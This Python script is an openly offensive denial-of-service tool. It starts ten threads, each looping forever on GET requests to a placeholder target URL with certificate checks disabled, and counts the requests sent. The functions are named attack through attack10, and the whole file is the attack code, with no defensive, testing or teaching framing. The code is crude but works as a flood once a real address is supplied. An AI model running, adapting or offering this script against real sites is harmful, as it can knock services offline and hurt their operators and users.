import requests
import threading
attacked = 0
site = "website url"
try:
    def attack():
        global attacked
        while True:
            print(attacked)
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack2():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack3():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack4():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1

    def attack5():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack6():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack7():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1

    def attack8():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack9():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1
    def attack10():
        while True:
            global attacked
            a4 = requests.get(site, verify=False)
            attacked = attacked + 1

except ConnectionError:
    exit()
atck = threading.Thread(target=attack)
atck.start()
atck2 = threading.Thread(target=attack2)
atck2.start()
atck3 = threading.Thread(target=attack3)
atck3.start()
atck4 = threading.Thread(target=attack4)
atck4.start()
atck5 = threading.Thread(target=attack5)
atck5.start()
atck6 = threading.Thread(target=attack6)
atck6.start()
atck7 = threading.Thread(target=attack7)
atck7.start()
atck8 = threading.Thread(target=attack8)
atck8.start()
atck9 = threading.Thread(target=attack9)
atck9.start()
atck10 = threading.Thread(target=attack10)
atck10.start()
